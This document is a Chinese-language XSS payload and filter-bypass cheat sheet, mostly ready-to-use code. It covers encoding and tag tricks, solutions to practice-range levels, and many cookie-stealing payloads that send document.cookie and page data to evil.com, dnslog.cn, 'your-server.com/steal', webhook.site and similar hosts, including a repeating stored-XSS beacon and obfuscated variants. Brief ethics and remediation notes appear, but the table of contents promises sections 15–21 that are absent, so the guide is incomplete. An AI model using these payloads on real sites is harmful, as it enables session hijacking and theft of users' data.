# XSS Payload 和绕过技术完整指南

## 目录

1. [XSS Payload 基础形式](#一xss-payload-基础形式)
2. [编码绕过技术](#二编码绕过技术)
3. [JavaScript 语法绕过](#三javascript-语法绕过)
4. [标签绕过技术](#四标签绕过技术)
5. [事件处理器绕过](#五事件处理器绕过)
6. [过滤绕过技术](#六过滤绕过技术)
7. [上下文相关绕过](#七上下文相关绕过)
8. [高级绕过技术](#八高级绕过技术)
9. [注释绕过技术](#九注释绕过技术)
10. [冷门知识点汇总](#十冷门知识点汇总)
11. [实战绕过案例](#十一实战绕过案例)
12. [外带服务验证技术](#十二外带服务验证技术)
13. [安全修复建议](#十三安全修复建议)
14. [总结](#十四总结)
15. [WAF 绕过技术](#十五waf-绕过技术)
16. [DOM XSS 技术](#十六dom-xss-技术)
17. [CSP 绕过技术](#十七csp-绕过技术)
18. [测试 Payload 汇总](#十八测试-payload-汇总)
19. [针对特定过滤器的 Payload](#十九针对特定过滤器的-payload)
20. [实战测试策略](#二十实战测试策略)
21. [常见过滤器绕过表](#二十一常见过滤器绕过表)

---

## 一、XSS Payload 基础形式

### 1.1 基础 Script 标签注入

```javascript
<script>alert(1)</script>
<script>alert(document.cookie)</script>
<script>document.location='http://evil.com/steal?c='+document.cookie</script>
```

### 1.2 事件处理器注入

```javascript
<img src=x onerror=alert(1)>
<img src=x onerror=alert(document.cookie)>
<body onload=alert(1)>
<svg onload=alert(1)>
<iframe onload=alert(1)>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
```

### 1.3 HTML 属性注入

```javascript
" onmouseover=alert(1) x="
' onmouseover=alert(1) x="
" autofocus onfocus=alert(1) x="
```

### 1.4 JavaScript 伪协议

```javascript
<a href="javascript:alert(1)">Click</a>
<iframe src="javascript:alert(1)">
<form action="javascript:alert(1)">
<button formaction="javascript:alert(1)">Click</button>
```

### 1.5 数据 URI

```javascript
<iframe src="data:text/html,<script>alert(1)</script>">
<object data="data:text/html,<script>alert(1)</script>">
<embed src="data:text/html,<script>alert(1)</script>">
```

---

## 二、编码绕过技术

### 2.1 HTML 实体编码

```javascript
&lt;script&gt;alert(1)&lt;/script&gt;
&#60;script&#62;alert(1)&#60;/script&#62;
&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;
```

**原理**：HTML 实体编码在页面渲染时会自动转换为原字符，且转换不受大写影响。

### 2.2 URL 编码

```javascript
%3Cscript%3Ealert(1)%3C/script%3E
%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
```

### 2.3 Unicode 编码

```javascript
\u003Cscript\u003Ealert(1)\u003C/script\u003E
\u003Cimg src=x onerror=alert(1)\u003E
```

### 2.4 十六进制编码

```javascript
\x3Cscript\x3Ealert(1)\x3C/script\x3E
\x3Cimg src=x onerror=alert(1)\x3E
```

### 2.5 八进制编码

```javascript
\074script\076alert(1)\074/script\076
```

### 2.6 Base64 编码

```javascript
<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
```

---

## 三、JavaScript 语法绕过

### 3.1 反引号替代圆括号

```javascript
<script>alert`1`</script>
<script>alert`document.cookie`</script>
```

### 3.2 括号替代

```javascript
<script>alert(1)</script>
<script>alert.call(null,1)</script>
<script>alert.apply(null,[1])</script>
```

### 3.3 点号替代

```javascript
<script>alert(document.cookie)</script>
<script>alert(document['cookie'])</script>
<script>alert(document["cookie"])</script>
<script>alert(window["document"]["cookie"])</script>
```

### 3.4 分号替代

```javascript
<script>alert(1);alert(2)</script>
<script>alert(1)%0Aalert(2)</script>
<script>alert(1)%0Dalert(2)</script>
```

---

## 四、标签绕过技术

### 4.1 大小写绕过

```javascript
<SCRIPT>alert(1)</SCRIPT>
<Script>alert(1)</Script>
<ScRiPt>alert(1)</ScRiPt>
<IMG SRC=x ONERROR=alert(1)>
```

### 4.2 自闭合标签绕过

```javascript
<script>alert(1)//<script>
<script>alert(1)//
<img src=x onerror=alert(1)//
```

### 4.3 标签分割

```javascript
<scr<script>ipt>alert(1)</scr<script>ipt>
<scr%00ipt>alert(1)</scr%00ipt>
```

### 4.4 空白字符绕过

```javascript
< script>alert(1)< /script>
<script >alert(1)</script >
<script/onload=alert(1)>
<script/onload=alert(1)>
```

### 4.5 换行符绕过

```javascript
<script>
alert(1)
</script>

<img/src=x/onerror=alert(1)>
<img
src
=
x
onerror
=
alert(1)
>
```

---

## 五、事件处理器绕过

### 5.1 各种事件处理器

```javascript
onload
onerror
onmouseover
onfocus
onblur
onclick
ondblclick
onmousedown
onmouseup
onmouseenter
onmouseleave
onkeydown
onkeyup
onkeypress
onsubmit
onreset
onchange
oninput
ontoggle
onanimationstart
onanimationend
ontransitionend
onpageshow
onpagehide
onpopstate
onhashchange
```

### 5.2 autofocus 技巧

```javascript
<input autofocus onfocus=alert(1)>
<textarea autofocus onfocus=alert(1)></textarea>
<select autofocus onfocus=alert(1)></select>
<button autofocus onfocus=alert(1)></button>
```

### 5.3 自动触发事件

```javascript
<body onload=alert(1)>
<svg onload=alert(1)>
<iframe onload=alert(1)>
<embed src=x onerror=alert(1)>
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>
```

---

## 六、过滤绕过技术

### 6.1 关键字过滤绕过

```javascript
// script 过滤
<scr<script>ipt>alert(1)</scr<script>ipt>
<scRiPt>alert(1)</ScRiPt>
<img src=x onerror=alert(1)>

// alert 过滤
<script>prompt(1)</script>
<script>confirm(1)</script>
<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
<script>eval('\x61\x6c\x65\x72\x74\x28\x31\x29')</script>
```

### 6.2 引号过滤绕过

```javascript
<script>alert(1)</script>
<script>alert`1`</script>
<script>alert(String.fromCharCode(49))</script>
<script>alert(/1/.source)</script>
```

### 6.3 圆括号过滤绕过

```javascript
<script>alert`1`</script>
<script>alert.call(null,1)</script>
<script>setTimeout`alert\u00281\u0029`</script>
```

### 6.4 空格过滤绕过

```javascript
<img/src=x/onerror=alert(1)>
<svg/onload=alert(1)>
<script/onload=alert(1)>
```

### 6.5 特殊字符过滤绕过

```javascript
// / 过滤
<script>alert(1)</script>
<script>alert.call(null,1)</script>

// < 过滤
<iframe src="javascript:alert(1)">
<img src=x onerror=alert(1)>

// > 过滤
<script>alert(1)//
<img src=x onerror=alert(1)//
```

---

## 七、上下文相关绕过

### 7.1 HTML 注释上下文

```javascript
<!-- --><script>alert(1)</script>
<!-- --!><script>alert(1)</script>
<!-- --><img src=x onerror=alert(1)>
```

### 7.2 Script 标签上下文

```javascript
// 在 script 标签内
';alert(1);//
</script><script>alert(1)</script>
`);alert(1);//
```

### 7.3 属性值上下文

```javascript
" onmouseover=alert(1) x="
' onmouseover=alert(1) x="
" autofocus onfocus=alert(1) x="
```

### 7.4 JavaScript 字符串上下文

```javascript
';alert(1);//
');alert(1);//
`);alert(1);//
</script><script>alert(1)</script>
```

---

## 八、高级绕过技术

### 8.1 Unicode 欺骗

```javascript
<script>\u0061\u006c\u0065\u0072\u0074(1)</script>
<script>\u{61}\u{6c}\u{65}\u{72}\u{74}(1)</script>
```

### 8.2 CSS 注入

```javascript
<style>
  @import url('javascript:alert(1)');
</style>
<style>
  body { background: url('javascript:alert(1)'); }
</style>
<style>
  x:expression(alert(1));
</style>
### 8.3 SVG 注入

```javascript
<svg onload=alert(1)>
<svg><script>alert(1)</script></svg>
<svg><g onload=alert(1)></g></svg>
```

---

## 九、注释绕过技术

### 9.1 HTML 注释符

```javascript
// 常规注释符
<!-- -->
<!-- --!>  // 冷门注释符，同样可闭合注释

// 使用示例
<!-- --><script>alert(1)</script>
<!-- --!><script>alert(1)</script>
```

**原理**：HTML 注释符有两种写法：`<!-- -->`（常规）和 `<!-- --!>`（冷门），同样可闭合注释。

### 9.2 JavaScript 注释符

```javascript
// 单行注释
/* 多行注释 */
--> HTML 单行注释符（可注释掉后续内容）
```

**原理**：`-->` 是 HTML 的单行注释符，可注释掉后续内容，且不被当前过滤规则拦截。

### 9.3 注释绕过过滤

```javascript
// 在 JavaScript 上下文中
alert(1)//  // 注释掉后续代码
alert(1)-->  // 使用 HTML 注释符

// 在 HTML 上下文中
<!-- --><script>alert(1)</script>
<!-- --!><script>alert(1)</script>
```

---

## 十、冷门知识点汇总

### 10.1 古英文字符绕过

```javascript
// ſ 是 s 的异体字，其大写形式为 S，且不被 [a-zA-Z] 过滤
<ſvg/onload=alert(1)>  // 大写后变为 <SVG/ONLOAD=ALERT(1)>
```

**原理**：古英文（古拉丁文）中，`ſ` 是 `s` 的异体字，其大写形式为 `S`，且不被 `[a-zA-Z]` 过滤。

### 10.2 不闭合标签执行

```javascript
// HTML 中部分标签无需完整闭合，只要事件属性存在即可触发执行
<svg/onload=alert(1)>
<img src=x onerror=alert(1)>
```

**原理**：部分标签无需完整闭合，只要事件属性（如 `onload`、`onerror`）存在，即可触发执行。

### 10.3 空格闭合标签

```javascript
// 在 </style> 的 style 后加空格，可绕过过滤且正常闭合标签
</style >
```

**原理**：空格不影响标签闭合功能，但能绕过正则匹配。

### 10.4 throw + onerror 绕过括号

```javascript
// 利用 window.onerror 捕获错误并执行 eval，将代码藏在错误信息中
<svg/onload="window.onerror=eval;throw'=alert\x281\x29';">
<img src onerror="window.onerror=eval;throw'=alert\x281\x29';">
```

**原理**：`\x28` 是 `(` 的十六进制编码，`throw` 抛出的字符串会被 `eval` 解析执行。

### 10.5 实体编码绕过大写

```javascript
// HTML 实体编码在页面渲染时自动转换为原字符，且转换不受大写影响
</H1> <img src=M onerror=&#97;&#108;&#101;&#114;&#116;(1)>
```

**原理**：`alert(1)` 在属性内，不被大写转换影响，直接执行。

### 10.6 双写绕过

```javascript
// 过滤 script 时，可以双写绕过
<scrscriptipt>alert(1)</scrscriptipt>
```

**原理**：`scrscriptipt` 被过滤后变为 `script`。

---

## 十一、实战绕过案例

### 11.1 0x00 - 无过滤

```javascript
<script>alert(1)</script>
```

### 11.2 0x01 - textarea 标签闭合

```javascript
</textarea><script>alert(1)</script>
```

### 11.3 0x02 - input 标签属性注入

```javascript
" onfocus=alert(1) autofocus "
```

### 11.4 0x03 - 括号过滤

```javascript
// 方案 1：反引号替代
<script>alert`1`</script>

// 方案 2：throw 绕过
<svg/onload="window.onerror=eval;throw'=alert\x281\x29';">
```

### 11.5 0x04 - 括号和反引号过滤

```javascript
<img src onerror="window.onerror=eval;throw'=alert\x281\x29';">
```

### 11.6 0x05 - HTML 注释符过滤

```javascript
--!><script>alert(1)</script>
```

### 11.7 0x06 - 正则过滤 auto/on.*=/>/ig

```javascript
onfocus
=alert(1);
```

**原理**：换行符会打断正则表达式 `on.*=` 中 `.*` 的连续匹配。

### 11.8 0x07 - 过滤所有标签

```javascript
<svg/onload=alert(1)>
```

**原理**：不闭合的标签不包含 `>`，因此不被正则 `<\\/?[^>]+>` 匹配。

### 11.9 0x08 - 过滤 </style>

```javascript
</style >
<img src="" onerror=alert(1) >
```

**原理**：空格不影响标签闭合功能，但能绕过正则匹配。

### 11.10 0x09 - URL 验证

```javascript
http://www.segmentfault.com" onerror="alert(1)
```

### 11.11 0x0A - URL 验证 + 实体编码

```javascript
https://www.segmentfault.com.haozi.me/j.js
```

**原理**：利用靶场自带的 JS 文件 `j.js`，内容为 `alert(1)`。

### 11.12 0x0B - 大写转换

```javascript
</H1> <img src=M onerror=alert(1)>
```

### 11.13 0x0C - 过滤 script + 大写转换

```javascript
</H1> <img src onerror=alert(1)>
```

**其他方案**：
- 双写 script：`</H1> <scrscriptipt src onerror=alert(1)></scrscriptipt>`
- svg 标签：`</H1> <svg onload=alert(1)>`

### 11.14 0x0D - 过滤 <>/'" + 单行注释

```javascript
（第一行：回车）
alert(1);
-->
```

### 11.15 0x0E - 过滤 <+字母 + 大写转换

```javascript
<ſvg/onload=alert(1)>
```

### 11.16 0x0F - 实体编码 + console.error

```javascript
'),alert(1); //
```

### 11.17 0x10 - 无过滤

```javascript
alert(1);
```

### 11.18 0x11 - JavaScript 字符串转义

```javascript
"); alert(1) //
```

**原理**：转义后的 `//` 仍能实现注释效果。

### 11.19 0x12 - 仅过滤双引号

```javascript
\");alert(1)//
```

**原理**：`\` 使 `\"` 变为 `"`。

---

## 十二、外带服务验证技术

### 12.1 外带验证概述

在 XSS 渗透测试中，除了使用 `alert()` 弹窗验证之外，使用外部数据外带服务（如 DNSLog.cn）来验证漏洞是更加专业和隐蔽的方法。

#### 为什么使用外带验证？

**Alert 弹窗的缺点**：
- ❌ 需要用户交互才能看到结果
- ❌ 容易被目标系统察觉
- ❌ 无法证明数据外带能力
- ❌ 不适合自动化测试

**外带验证的优点**：
- ✅ 无需用户交互，自动触发
- ✅ 隐蔽性强，不易被察觉
- ✅ 可以获取敏感信息（cookie、URL、referrer 等）
- ✅ 证明数据外带能力
- ✅ 适合自动化测试和批量验证
- ✅ 为漏洞报告提供有力证据

---

### 12.2 DNSLog.cn 外带验证

#### 12.2.1 基础 DNS 外带

**原理**：通过创建一个 Image 对象并设置 src 属性为 DNSLog 域名，触发 DNS 查询。

```javascript
<script>
var img = new Image();
img.src = "http://www.dnslog.cn/your-unique-id";
</script>
```

**使用步骤**：
1. 访问 `http://www.dnslog.cn/` 查看是否有新的 DNS 查询记录
2. 如果看到包含 `your-unique-id` 的查询记录，说明 XSS 漏洞存在

#### 12.2.2 获取 Cookie 并外带

```javascript
<script>
var img = new Image();
img.src = "http://www.dnslog.cn/" + document.cookie;
</script>
```

**注意事项**：
- Cookie 可能包含特殊字符，需要进行编码
- 建议使用 Base64 编码：

```javascript
<script>
var img = new Image();
img.src = "http://www.dnslog.cn/" + btoa(document.cookie);
</script>
```

#### 12.2.3 获取更多敏感信息

```javascript
<script>
var img = new Image();
var data = {
    cookie: document.cookie,
    url: window.location.href,
    referrer: document.referrer,
    userAgent: navigator.userAgent,
    title: document.title
};
img.src = "http://www.dnslog.cn/" + btoa(JSON.stringify(data));
</script>
```

**解码方法**：
```bash
echo "base64-encoded-data" | base64 -d
```

#### 12.2.4 持续监控（存储型 XSS）

```javascript
<script>
setInterval(function(){
    var img = new Image();
    img.src = "http://www.dnslog.cn/stored-xss-" + Date.now() + "-" + document.cookie;
}, 5000);
</script>
```

**说明**：每 5 秒发送一次请求，用于持续监控存储型 XSS 的触发情况。

#### 12.2.5 在不同上下文中使用

**HTML 属性上下文**：
```javascript
" onerror="var i=new Image();i.src='http://www.dnslog.cn/'+document.cookie" x="
```

**JavaScript 字符串上下文**：
```javascript
');var i=new Image();i.src='http://www.dnslog.cn/'+document.cookie;//
```

**URL 参数上下文**：
```javascript
#<script>var i=new Image();i.src='http://www.dnslog.cn/'+document.cookie</script>
```

**HTML 注释上下文**：
```javascript
--><script>var i=new Image();i.src='http://www.dnslog.cn/'+document.cookie</script>
```

#### 12.2.6 编码绕过 + DNS 外带

**Unicode 编码**：
```javascript
<script>
var i=new Image();
i.src='http://www.dnslog.cn/'+eval(String.fromCharCode(100,111,99,117,101,110,116,40,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,41));
</script>
```

**十六进制编码**：
```javascript
<script>
var i=new Image();
i.src='http://www.dnslog.cn/'+eval('\x64\x6f\x63\x75\x6d\x65\x6e\x74\x2e\x63\x6f\x6f\x6b\x69\x65');
</script>
```

---

### 12.3 HTTP 请求外带

#### 12.3.1 Fetch API 外带

```javascript
<script>
fetch('http://your-server.com/steal?data=' + encodeURIComponent(document.cookie));
</script>
```

**完整示例**：
```javascript
<script>
var data = {
    cookie: document.cookie,
    url: window.location.href,
    userAgent: navigator.userAgent
};
fetch('http://your-server.com/steal', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json'
    },
    body: JSON.stringify(data)
});
</script>
```

#### 12.3.2 XMLHttpRequest 外带

```javascript
<script>
var xhr = new XMLHttpRequest();
xhr.open('GET', 'http://your-server.com/steal?data=' + encodeURIComponent(document.cookie), true);
xhr.send();
</script>
```

**POST 请求**：
```javascript
<script>
var xhr = new XMLHttpRequest();
xhr.open('POST', 'http://your-server.com/steal', true);
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
xhr.send('data=' + encodeURIComponent(document.cookie));
</script>
```

#### 12.3.3 Image 外带（最常用）

```javascript
<script>
var img = new Image();
img.src = 'http://your-server.com/steal?data=' + encodeURIComponent(document.cookie);
</script>
```

**优点**：
- 无需考虑跨域问题
- 简单易用
- 兼容性好

---

### 12.4 WebSocket 外带

```javascript
<script>
var ws = new WebSocket('ws://your-server.com/' + document.cookie);
ws.onopen = function() {
    ws.send('XSS verified');
};
</script>
```

**完整示例**：
```javascript
<script>
var data = {
    cookie: document.cookie,
    url: window.location.href,
    userAgent: navigator.userAgent
};
var ws = new WebSocket('ws://your-server.com/ws');
ws.onopen = function() {
    ws.send(JSON.stringify(data));
};
</script>
```

---

### 12.5 其他验证方法

#### 12.5.1 修改页面内容

```javascript
<script>
document.body.innerHTML = '<h1>XSS 漏洞已验证</h1>';
document.title = 'XSS 漏洞已验证';
</script>
```

#### 12.5.2 控制台日志

```javascript
<script>
console.log('XSS 漏洞已验证: ' + document.cookie);
console.log('URL: ' + window.location.href);
</script>
```

#### 12.5.3 组合多种验证方法

```javascript
<script>
// 方法 1：DNS 外带
var i = new Image();
i.src = 'http://www.dnslog.cn/combined-' + document.cookie;

// 方法 2：控制台日志
console.log('XSS Verified:', document.cookie);

// 方法 3：修改页面标题
document.title = 'XSS 漏洞已验证';

// 方法 4：修改页面内容
document.body.innerHTML = '<h1>XSS 漏洞已验证</h1>';
</script>
```

---

### 12.6 外带服务推荐

#### 12.6.1 DNSLog.cn

**官方网站**：http://www.dnslog.cn/

**特点**：
- 免费、无需注册
- 实时查看 DNS 查询记录
- 支持自定义子域名

**使用方法**：
1. 访问 `http://www.dnslog.cn/`
2. 查看当前可用的子域名
3. 在 Payload 中使用该子域名
4. 刷新页面查看 DNS 查询记录

**示例**：
```javascript
<script>
var img = new Image();
img.src = "http://www.dnslog.cn/" + btoa(document.cookie);
</script>
```

#### 12.6.2 Burp Collaborator

**官方网站**：https://portswigger.net/burp/documentation/collaborator

**特点**：
- Burp Suite 自带
- 支持 DNS、HTTP、SMTP 等多种协议
- 实时接收和查看外带数据

**安装方法**：
1. 下载 Burp Suite：https://portswigger.net/burp/releases
2. 安装 Burp Suite Professional（或使用免费版）
3. 启动 Burp Suite
4. 在 Burp Suite 菜单中选择 "Burp Collaborator Client"

**使用方法**：
1. 打开 Burp Suite
2. 进入 Burp Collaborator Client
3. 生成一个新的 Collaborator Payload
4. 在测试中使用该 Payload
5. 在 Collaborator Client 中查看结果

**示例**：
```javascript
<script>
var img = new Image();
img.src = "http://your-collaborator-payload.burpcollaborator.net/" + document.cookie;
</script>
```

#### 12.6.3 XSS Hunter

**官方网站**：https://xsshunter.com/（已弃用）

**自建服务**：https://github.com/mandatoryprogrammer/xsshunter-express

**特点**：
- 专业的 XSS 测试平台
- 自动收集漏洞信息
- 提供详细的漏洞报告
- 支持自建服务，无需依赖第三方

**使用方法（在线服务）**：
1. 访问 https://xsshunter.com/
2. 注册 XSS Hunter 账户
3. 获取专属的 Payload（形如 `https://your-xsshunter-payload.com/xss.js`）
4. 在测试中使用该 Payload
5. 在 XSS Hunter 平台查看结果

**自建服务方法（推荐）**：

由于官方 XSS Hunter 服务已弃用，推荐使用 XSS Hunter Express 自建服务。

**系统要求**：
- 安装 Docker 和 docker-compose
- 至少 2GB RAM 的主机
- 一个主机名（如 host.example.com），可以映射到服务器 IP（需要 DNS 控制权）
- [邮件通知] 需要 SMTP 凭据的邮箱账户（可选）

**配置步骤**：

1. **克隆仓库**：
   ```bash
   git clone https://github.com/mandatoryprogrammer/xsshunter-express.git
   cd xsshunter-express
   ```

2. **修改 docker-compose.yaml**：
   ```yaml
   # 必需配置
   HOSTNAME: 设置为你的主机名（如 xss.ht），越短越好
   SSL_CONTACT_EMAIL: 用于自动设置和续订 TLS/SSL 证书的邮箱地址
   
   # 可选配置（邮件通知）
   SMTP_EMAIL_NOTIFICATIONS_ENABLED: 启用邮件通知
   SMTP_HOST: SMTP 服务器主机（如 smtp.gmail.com）
   SMTP_PORT: SMTP 服务器端口（如 465）
   SMTP_USE_TLS: 是否使用 TLS
   SMTP_USERNAME: 邮箱用户名
   SMTP_PASSWORD: 邮箱密码
   SMTP_FROM_EMAIL: 发件邮箱地址
   SMTP_RECEIVER_EMAIL: 接收通知的邮箱地址
   
   # 安全配置
   CONTROL_PANEL_ENABLED: 禁用 Web 控制面板以最小化攻击面
   ```

3. **启动服务**：
   ```bash
   # 启动 PostgreSQL 数据库
   docker-compose up -d postgresdb
   
   # 启动 XSS Hunter Express
   docker-compose up xsshunterexpress
   ```

4. **访问管理面板**：
   - 首次启动会显示管理员密码
   - 访问 `https://your-hostname.com/admin/`
   - 使用显示的密码登录

**功能特性**：

- **强大的 XSS 探针**：每次触发时收集以下信息
  - 漏洞页面的 URI
  - 执行来源
  - 受害者 IP 地址
  - 页面 Referer
  - 受害者 User Agent
  - 所有非 HTTP-Only Cookie
  - 页面完整 HTML DOM
  - 受影响页面的完整截图
  - 负责的 HTTP 请求
  - 浏览器报告的时间
  - Payload 是否在 iframe 中触发

- **完全 Docker 化**：修改配置后使用单个命令启动
- **自动 TLS/SSL 设置和续订**：自动使用 LetsEncrypt 设置和续订证书
- **Gzip 压缩**：所有图像使用 gzip 压缩，减少磁盘空间使用
- **最小化攻击面**：可选禁用 Web UI
- **完整页面截图**：使用 HTML5 canvas API 生成完整截图
- **邮件报告**：发送详细的邮件报告
- **自动 Payload 生成**：自动生成 XSS Payload
- **关联注入**：关联注入尝试和 Payload 触发

**示例**：
```javascript
<script src="https://your-xsshunter-payload.com/xss.js"></script>
```

**注意事项**：
- 首次 HTTP 请求会较慢（约 15 秒），因为服务会自动生成 TLS/SSL 证书
- 建议使用简短的主机名（如 xss.ht），以便 Payload 可以适应各种测试字段
- 如果不需要 Web UI，可以禁用控制面板以最小化攻击面

#### 12.6.4 RequestBin

**官方网站**：https://requestbin.com/

**特点**：
- 免费、无需注册
- 实时查看 HTTP 请求
- 支持查看请求头和请求体

**使用方法**：
1. 访问 `https://requestbin.com/`
2. 创建一个新的 RequestBin
3. 获取 RequestBin URL
4. 在 Payload 中使用该 URL
5. 在 RequestBin 页面查看请求

**示例**：
```javascript
<script>
var img = new Image();
img.src = "https://your-requestbin-url.com/steal?data=" + encodeURIComponent(document.cookie);
</script>
```

#### 12.6.5 Webhook.site

**官方网站**：https://webhook.site/

**特点**：
- 免费、无需注册
- 实时查看 Webhook 请求
- 支持多种数据格式

**使用方法**：
1. 访问 `https://webhook.site/`
2. 获取专属的 Webhook URL
3. 在 Payload 中使用该 URL
4. 在 Webhook.site 页面查看请求

**示例**：
```javascript
<script>
var img = new Image();
img.src = "https://your-webhook-url.com/steal?data=" + encodeURIComponent(document.cookie);
</script>
```

#### 12.6.6 DNSBin

**官方网站**：https://dnsbin.zhack.ca/

**特点**：
- 免费、无需注册
- 实时查看 DNS 查询
- 支持自定义子域名

**使用方法**：
1. 访问 `https://dnsbin.zhack.ca/`
2. 生成一个新的 DNS 记录
3. 在 Payload 中使用该记录
4. 在 DNSBin 页面查看查询

**示例**：
```javascript
<script>
var img = new Image();
img.src = "http://your-dnsbin-record.dnsbin.zhack.ca/" + document.cookie;
</script>
```

---

### 12.7 实战案例：使用 DNSLog.cn 验证 XSS

#### 12.7.1 场景 1：反射型 XSS

**目标 URL**：`http://example.com/search?q=test`

**Payload**：
```javascript
"><script>var i=new Image();i.src='http://www.dnslog.cn/xss-'+document.cookie;</script>
```

**验证步骤**：
1. 访问 `http://www.dnslog.cn/` 查看是否有新的 DNS 查询记录
2. 如果看到包含 cookie 的查询记录，说明 XSS 漏洞存在且可以利用
3. 对查询记录进行 Base64 解码，获取完整的 cookie 信息

#### 12.7.2 场景 2：存储型 XSS

**注入点**：用户评论或个人资料

**Payload**：
```javascript
</textarea><script>
setInterval(function(){
    var i=new Image();
    i.src='http://www.dnslog.cn/stored-xss-'+Date.now()+'-'+btoa(document.cookie);
}, 5000);
</script>
```

**验证步骤**：
1. 提交包含 Payload 的内容
2. 访问 `http://www.dnslog.cn/` 查看是否有持续的 DNS 查询
3. 由于使用了 `setInterval`，每 5 秒会发送一次请求
4. 通过时间戳可以确认每次请求的时间

#### 12.7.3 场景 3：DOM 型 XSS

**注入点**：URL hash 或 search 参数

**Payload**：
```javascript
#<script>
var i=new Image();
i.src='http://www.dnslog.cn/dom-xss-'+btoa(document.cookie);
</script>
```

**验证步骤**：
1. 访问包含 Payload 的 URL
2. 查看 DNSLog.cn 的查询记录
3. 验证是否成功获取了 cookie

#### 12.7.4 场景 4：过滤绕过 + DNS 外带

**过滤规则**：过滤 `alert`、`script`、`cookie`

**Payload**：
```javascript
<ſvg/onload="var i=new Image();i.src='http://www.dnslog.cn/'+btoa(eval(String.fromCharCode(100,111,99,117,101,110,116,46,99,111,111,107,105,101,65,100,100,114,101,115,115)))">
```

**说明**：
- 使用古英文字符 `ſ` 绕过 `<[a-zA-Z]` 过滤
- 使用 `String.fromCharCode` 绕过关键字过滤
- 使用 `btoa` 进行 Base64 编码

---

### 12.8 安全测试建议

#### 12.8.1 道德准则

- ⚠️ **仅限授权测试**：只在获得明确授权的范围内进行测试
- ⚠️ **不要窃取真实数据**：使用测试标识，不要获取真实用户数据
- ⚠️ **及时报告漏洞**：发现漏洞后及时向目标报告
- ⚠️ **遵守法律法规**：遵守所在国家和地区的相关法律法规

#### 12.8.2 测试标识

在 Payload 中使用测试标识，避免与真实数据混淆：

```javascript
<script>
var img = new Image();
img.src = "http://www.dnslog.cn/test-xss-" + document.cookie;
</script>
```

#### 12.8.3 数据保护

- **不要在 DNS 查询中发送真实敏感数据**
- **使用加密或编码保护测试数据**
- **测试完成后删除相关记录**

#### 12.8.4 测试流程

1. **准备阶段**：
   - 获取测试授权
   - 准备外带服务（如 DNSLog.cn）
   - 准备测试 Payload

2. **测试阶段**：
   - 使用基础 Payload 验证漏洞存在
   - 使用外带 Payload 验证数据外带能力
   - 记录所有测试结果

3. **报告阶段**：
   - 编写详细的漏洞报告
   - 提供修复建议
   - 删除测试数据

4. **清理阶段**：
   - 删除测试 Payload
   - 清理外带服务记录
   - 确认没有残留测试数据

---

### 12.9 外带验证对比表

| 验证方法 | 优点 | 缺点 | 适用场景 |
|---------|------|------|---------|
| **Alert 弹窗** | 简单直观、立即可见 | 需要用户交互、易被察觉 | 基础验证、快速测试 |
| **DNS 外带** | 自动触发、隐蔽性强 | 依赖网络连接、可能被拦截 | 自动化测试、批量验证 |
| **HTTP 外带** | 数据量大、实时性好 | 可能被 CORS 阻止 | 详细数据收集 |
| **WebSocket 外带** | 双向通信、实时性强 | 需要服务器支持 | 实时监控、持续验证 |
| **控制台日志** | 不影响页面、易于调试 | 需要开发者工具 | 开发环境测试 |
| **页面修改** | 直观可见、无需工具 | 易被察觉、影响用户体验 | 概念验证 |

### 12.9.1 外带服务对比表

| 服务 | 官方网站 | 优点 | 缺点 | 适用场景 |
|------|----------|------|------|---------|
| **DNSLog.cn** | http://www.dnslog.cn/ | 免费、无需注册、实时查看 | 依赖网络连接、可能被拦截 | 快速验证、自动化测试 |
| **Burp Collaborator** | https://portswigger.net/burp/documentation/collaborator | 支持多种协议、实时接收 | 需要 Burp Suite | 专业渗透测试 |
| **XSS Hunter** | https://xsshunter.com/（已弃用）<br>自建：https://github.com/mandatoryprogrammer/xsshunter-express | 自动收集、详细报告、完整页面截图 | 需要自建、需要 Docker | 长期监控、漏洞收集、专业渗透测试 |
| **RequestBin** | https://requestbin.com/ | 免费、实时查看 HTTP | 仅支持 HTTP | HTTP 请求分析 |
| **Webhook.site** | https://webhook.site/ | 免费、支持多种格式 | 仅支持 Webhook | Webhook 测试 |
| **DNSBin** | https://dnsbin.zhack.ca/ | 免费、实时查看 DNS | 仅支持 DNS | DNS 查询验证 |

---

### 12.10 最佳实践

#### 12.10.1 选择合适的外带服务

- **DNSLog.cn**：适合快速验证、自动化测试
- **Burp Collaborator**：适合专业渗透测试
- **XSS Hunter Express**：适合长期监控、漏洞收集、专业渗透测试（推荐自建）
- **RequestBin/Webhook.site**：适合 HTTP 请求分析

#### 12.10.2 Payload 设计原则

1. **简洁性**：Payload 尽量简洁，减少被过滤的风险
2. **隐蔽性**：使用编码、混淆等技术提高隐蔽性
3. **可靠性**：确保 Payload 在不同环境下都能正常工作
4. **可追溯性**：使用测试标识，便于追踪和清理

#### 12.10.3 编码和混淆

**Base64 编码**：
```javascript
<script>
var img = new Image();
img.src = "http://www.dnslog.cn/" + btoa(document.cookie);
</script>
```

**URL 编码**：
```javascript
<script>
var img = new Image();
img.src = "http://www.dnslog.cn/" + encodeURIComponent(document.cookie);
</script>
```

**Unicode 编码**：
```javascript
<script>
var img = new Image();
img.src = "http://www.dnslog.cn/" + eval(String.fromCharCode(100,111,99,117,101,110,116,46,99,111,111,107,105,101));
</script>
```

---

## 十三、安全修复建议

### 13.1 输入验证

- 对所有用户输入进行严格的验证和过滤
- 使用白名单机制限制允许的输入
- 避免使用黑名单机制（容易被绕过）

### 13.2 输出编码

- 对用户输入进行 HTML 实体编码
- 对 JavaScript 代码中的用户输入进行 JavaScript 编码
- 使用安全的模板引擎（如 React、Vue、Angular）

### 13.3 内容安全策略

- 实施严格的内容安全策略 (CSP)
- 限制外部脚本源的加载
- 禁用内联脚本执行

### 13.4 正则表达式改进

- 考虑换行符、空格等特殊情况
- 使用 Unicode 感知的正则表达式
- 避免使用简单的黑名单正则

---

## 十四、总结

本指南涵盖了 XSS 攻击的各种 Payload 形式和绕过技术，包括：

1. 基础 XSS Payload 形式
2. 多种编码绕过技术
3. JavaScript 语法绕过
4. 标签绕过技术
5. 事件处理器绕过
6. 注释绕过技术
7. 冷门知识点汇总
